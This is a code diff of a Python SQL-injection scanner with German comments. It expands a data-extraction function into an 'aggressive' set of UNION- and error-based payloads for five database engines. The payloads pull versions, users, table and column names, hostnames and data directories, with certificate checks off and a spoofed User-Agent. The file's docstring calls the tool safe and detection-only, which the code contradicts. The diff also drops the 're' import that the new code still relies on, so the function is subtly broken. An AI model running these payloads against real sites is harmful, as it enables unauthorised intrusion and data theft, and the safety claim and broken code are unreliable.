@@ -10,7 +10,6 @@ SAFE: Only DETECTS, does NOT exploit or extract data.
 """
 import requests
 import time
-import re
 
 # Boolean-Based payloads (safe - only TRUE/FALSE conditions)
 BOOLEAN_PAYLOADS = [
@@ -21,7 +20,7 @@ BOOLEAN_PAYLOADS = [
     ("' AND 1=1/*", "' AND 1=2/*", "C-style comment"),
     ("'||'1'='1", "'||'1'='2", "Oracle string concat"),
     ("' AND 1=1;--", "' AND 1=2;--", "MSSQL semicolon"),
-    (") AND 1=1--", ") AND 1=2--", "Closed parenthesis"),
+    ("') AND 1=1--", "') AND 1=2--", "Closed parenthesis"),
     ("')) AND 1=1--", "')) AND 1=2--", "Double parenthesis"),
     ("%' AND 1=1 AND '%'='", "%' AND 1=2 AND '%'='", "LIKE clause"),
 ]
@@ -107,71 +106,123 @@ def _send_payload(target, payload, param="id"):
 
 
 def _try_extract_data(target, db_type='mysql', param='id'):
-    """Versuche tatsaechlich DB-Daten zu extrahieren"""
+    """Versuche tatsaechlich DB-Daten zu extrahieren - AGGRESSIV"""
     extracted = []
+    seen = set()
     
-    extraction_payloads = {
-        'mysql': [
-            ("1' UNION SELECT CONCAT('DBVERSION:',version()),2,3--", r'DBVERSION:([^<\s]+)', 'DB-Version'),
-            ("1' UNION SELECT CONCAT('DBNAME:',database()),2,3--", r'DBNAME:([^<\s]+)', 'DB-Name'),
-            ("1' UNION SELECT CONCAT('DBUSER:',user()),2,3--", r'DBUSER:([^<\s@]+@[^<\s]+)', 'DB-User'),
-            ("1' AND extractvalue(1,concat(0x7e,version(),0x7e))--", r'~([^~]+)~', 'DB-Version'),
-            ("1' AND extractvalue(1,concat(0x7e,database(),0x7e))--", r'~([^~]+)~', 'DB-Name'),
-        ],
-        'postgresql': [
-            ("1' UNION SELECT version(),NULL,NULL--", r'(PostgreSQL[^<\s]+)', 'DB-Version'),
-            ("1' UNION SELECT current_database(),NULL,NULL--", r'([^<\s]+)', 'DB-Name'),
-        ],
-        'mssql': [
-            ("1' UNION SELECT @@version,NULL,NULL--", r'(Microsoft[^<]+)', 'DB-Version'),
-            ("1' UNION SELECT DB_NAME(),NULL,NULL--", r'([^<\s]+)', 'DB-Name'),
-        ],
-        'oracle': [
-            ("1' UNION SELECT banner,NULL FROM v$version--", r'([^<]+)', 'DB-Version'),
-            ("1' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM DUAL--", r'([^<\s]+)', 'DB-Name'),
-        ],
-        'sqlite': [
-            ("1' UNION SELECT sqlite_version(),NULL--", r'([\d\.]+)', 'DB-Version'),
-            ("1' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--", r'([^<\s]+)', 'Tabellen'),
-        ],
+    _EXTRACTION_PAYLOADS_BLIND = {
+        'mysql': {
+            'version': [
+                ("1' UNION SELECT CONCAT('|||V:',version(),'|||'),2,3--", r'\|\|\|V:([^\|]+)\|\|\|'),
+                ("1' AND extractvalue(1,concat(0x7e,version(),0x7e))--", r'~([^~]+)~'),
+                ("1' UNION SELECT CONCAT('|||V:',@@version,'|||'),2,3--", r'\|\|\|V:([^\|]+)\|\|\|'),
+            ],
+            'database': [
+                ("1' UNION SELECT CONCAT('|||DB:',database(),'|||'),2,3--", r'\|\|\|DB:([^\|]+)\|\|\|'),
+                ("1' AND extractvalue(1,concat(0x7e,database(),0x7e))--", r'~([^~]+)~'),
+            ],
+            'user': [
+                ("1' UNION SELECT CONCAT('|||U:',user(),'|||'),2,3--", r'\|\|\|U:([^\|]+)\|\|\|'),
+                ("1' UNION SELECT CONCAT('|||U:',current_user(),'|||'),2,3--", r'\|\|\|U:([^\|]+)\|\|\|'),
+            ],
+            'tables': [
+                ("1' UNION SELECT CONCAT('|||T:',group_concat(table_name),'|||'),2,3 FROM information_schema.tables WHERE table_schema=database()--", r'\|\|\|T:([^\|]+)\|\|\|'),
+                ("1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--", r'~([^~]+)~'),
+            ],
+            'columns': [
+                ("1' UNION SELECT CONCAT('|||C:',group_concat(column_name),'|||'),2,3 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'--", r'\|\|\|C:([^\|]+)\|\|\|'),
+            ],
+            'counts': [
+                ("1' UNION SELECT CONCAT('|||N:',count(*),'|||'),2,3 FROM information_schema.tables WHERE table_schema=database()--", r'\|\|\|N:(\d+)\|\|\|'),
+                ("1' UNION SELECT CONCAT('|||H:',@@hostname,'|||'),2,3--", r'\|\|\|H:([^\|]+)\|\|\|'),
+                ("1' UNION SELECT CONCAT('|||D:',@@datadir,'|||'),2,3--", r'\|\|\|D:([^\|]+)\|\|\|'),
+            ],
+        },
+        'postgresql': {
+            'version': [("1' UNION SELECT CONCAT('|||V:',version(),'|||'),NULL,NULL--", r'\|\|\|V:([^\|]+)\|\|\|')],
+            'database': [("1' UNION SELECT CONCAT('|||DB:',current_database(),'|||'),NULL,NULL--", r'\|\|\|DB:([^\|]+)\|\|\|')],
+            'user': [("1' UNION SELECT CONCAT('|||U:',current_user,'|||'),NULL,NULL--", r'\|\|\|U:([^\|]+)\|\|\|')],
+            'tables': [("1' UNION SELECT CONCAT('|||T:',string_agg(table_name,','),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|T:([^\|]+)\|\|\|')],
+            'columns': [("1' UNION SELECT CONCAT('|||C:',string_agg(column_name,','),'|||'),NULL,NULL FROM information_schema.columns WHERE table_name='users'--", r'\|\|\|C:([^\|]+)\|\|\|')],
+            'counts': [
+                ("1' UNION SELECT CONCAT('|||N:',count(*),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|N:(\d+)\|\|\|'),
+                ("1' UNION SELECT CONCAT('|||H:',inet_server_addr(),'|||'),NULL,NULL--", r'\|\|\|H:([^\|]+)\|\|\|'),
+            ],
+        },
+        'mssql': {
+            'version': [("1' UNION SELECT CONCAT('|||V:',@@version,'|||'),NULL,NULL--", r'\|\|\|V:([^\|]+)\|\|\|')],
+            'database': [("1' UNION SELECT CONCAT('|||DB:',DB_NAME(),'|||'),NULL,NULL--", r'\|\|\|DB:([^\|]+)\|\|\|')],
+            'user': [("1' UNION SELECT CONCAT('|||U:',SYSTEM_USER,'|||'),NULL,NULL--", r'\|\|\|U:([^\|]+)\|\|\|')],
+            'tables': [("1' UNION SELECT CONCAT('|||T:',STRING_AGG(name,','),'|||'),NULL,NULL FROM sys.tables--", r'\|\|\|T:([^\|]+)\|\|\|')],
+            'columns': [("1' UNION SELECT CONCAT('|||C:',STRING_AGG(name,','),'|||'),NULL,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--", r'\|\|\|C:([^\|]+)\|\|\|')],
+            'counts': [
+                ("1' UNION SELECT CONCAT('|||N:',COUNT(*),'|||'),NULL,NULL FROM sys.tables--", r'\|\|\|N:(\d+)\|\|\|'),
+                ("1' UNION SELECT CONCAT('|||H:',SERVERPROPERTY('MachineName'),'|||'),NULL,NULL--", r'\|\|\|H:([^\|]+)\|\|\|'),
+            ],
+        },
+        'oracle': {
+            'version': [("1' UNION SELECT CONCAT('|||V:',banner,'|||'),NULL FROM v$version WHERE ROWNUM=1--", r'\|\|\|V:([^\|]+)\|\|\|')],
+            'database': [("1' UNION SELECT CONCAT('|||DB:',SYS_CONTEXT('USERENV','DB_NAME'),'|||'),NULL FROM DUAL--", r'\|\|\|DB:([^\|]+)\|\|\|')],
+            'user': [("1' UNION SELECT CONCAT('|||U:',USER,'|||'),NULL FROM DUAL--", r'\|\|\|U:([^\|]+)\|\|\|')],
+            'tables': [("1' UNION SELECT CONCAT('|||T:',LISTAGG(table_name,','),'|||'),NULL FROM user_tables--", r'\|\|\|T:([^\|]+)\|\|\|')],
+            'columns': [("1' UNION SELECT CONCAT('|||C:',LISTAGG(column_name,','),'|||'),NULL FROM user_tab_columns WHERE table_name='USERS'--", r'\|\|\|C:([^\|]+)\|\|\|')],
+            'counts': [
+                ("1' UNION SELECT CONCAT('|||N:',COUNT(*),'|||'),NULL FROM user_tables--", r'\|\|\|N:(\d+)\|\|\|'),
+                ("1' UNION SELECT CONCAT('|||H:',SYS_CONTEXT('USERENV','HOST'),'|||'),NULL FROM DUAL--", r'\|\|\|H:([^\|]+)\|\|\|'),
+            ],
+        },
+        'sqlite': {
+            'version': [("1' UNION SELECT '|||V:'||sqlite_version()||'|||',NULL--", r'\|\|\|V:([\d\.]+)\|\|\|')],
+            'database': [("1' UNION SELECT '|||DB:'||name||'|||',NULL FROM pragma_database_list() WHERE seq=0--", r'\|\|\|DB:([^\|]+)\|\|\|')],
+            'tables': [("1' UNION SELECT '|||T:'||group_concat(name,',')||'|||',NULL FROM sqlite_master WHERE type='table'--", r'\|\|\|T:([^\|]+)\|\|\|')],
+            'columns': [("1' UNION SELECT '|||C:'||sql||'|||',NULL FROM sqlite_master WHERE type='table' AND name='users'--", r'\|\|\|C:([^\|]+)\|\|\|')],
+            'counts': [("1' UNION SELECT '|||N:'||COUNT(*)||'|||',NULL FROM sqlite_master WHERE type='table'--", r'\|\|\|N:(\d+)\|\|\|')],
+        },
     }
     
-    payloads = extraction_payloads.get(db_type, extraction_payloads['mysql'])
-    
-    for payload, pattern, label in payloads:
-        try:
-            url = f'{target}?{param}={requests.utils.quote(payload)}'
-            resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
-                               headers={'User-Agent': 'Mozilla/5.0'})
-            match = re.search(pattern, resp.text)
-            if match:
-                val = match.group(1).strip()
-                if len(val) > 1 and len(val) < 200:
-                    extracted.append(f"{label}: {val}")
-        except:
-            continue
-    
-    # Try table extraction
-    table_payloads = {
-        'mysql': "1' UNION SELECT CONCAT('TABLES:',group_concat(table_name)),2,3 FROM information_schema.tables WHERE table_schema=database()--",
-        'postgresql': "1' UNION SELECT string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--",
-        'mssql': "1' UNION SELECT string_agg(name,','),NULL,NULL FROM sys.tables--",
-        'oracle': "1' UNION SELECT LISTAGG(table_name,','),NULL FROM user_tables--",
-        'sqlite': "1' UNION SELECT group_concat(name,','),NULL FROM sqlite_master WHERE type='table'--",
+    label_map = {
+        'version': 'DB-Version', 'database': 'DB-Name', 'user': 'DB-User',
+        'tables': 'Tabellen', 'columns': 'Spalten', 'counts': 'Anzahl',
     }
     
-    tpayload = table_payloads.get(db_type, table_payloads['mysql'])
-    try:
-        url = f'{target}?{param}={requests.utils.quote(tpayload)}'
-        resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
-                           headers={'User-Agent': 'Mozilla/5.0'})
-        match = re.search(r'TABLES:([^<]+)', resp.text)
-        if match:
-            tables = match.group(1).split(',')[:8]
-            if tables and tables[0]:
-                extracted.append(f"Tabellen: {', '.join(tables)}")
-    except:
-        pass
+    db_payloads = _EXTRACTION_PAYLOADS_BLIND.get(db_type, _EXTRACTION_PAYLOADS_BLIND['mysql'])
+    
+    for category, payload_list in db_payloads.items():
+        for payload, pattern in payload_list:
+            try:
+                url = f'{target}?{param}={requests.utils.quote(payload)}'
+                resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
+                                   headers={'User-Agent': 'Mozilla/5.0'})
+                if not resp.text:
+                    continue
+                matches = re.findall(pattern, resp.text)
+                for match in matches:
+                    val = match.strip() if isinstance(match, str) else match[0].strip() if isinstance(match, tuple) else str(match).strip()
+                    if not val or len(val) < 1 or len(val) > 500:
+                        continue
+                    label = label_map.get(category, category)
+                    key = f"{category}:{val[:50]}"
+                    if key in seen:
+                        continue
+                    seen.add(key)
+                    if category == 'tables' and ',' in val:
+                        tables = [t.strip() for t in val.split(',')[:15]]
+                        extracted.append(f"Tabellen: {', '.join(tables)}")
+                    elif category == 'columns' and ',' in val:
+                        cols = [c.strip() for c in val.split(',')[:10]]
+                        extracted.append(f"Spalten: {', '.join(cols)}")
+                    elif category == 'counts':
+                        extracted.append(f"Anzahl Tabellen: {val}")
+                    elif category == 'version':
+                        extracted.append(f"DB-Version: {val}")
+                    elif category == 'database':
+                        extracted.append(f"DB-Name: {val}")
+                    elif category == 'user':
+                        extracted.append(f"DB-User: {val}")
+                    else:
+                        extracted.append(f"{label}: {val}")
+            except Exception:
+                continue
     
     return extracted
 
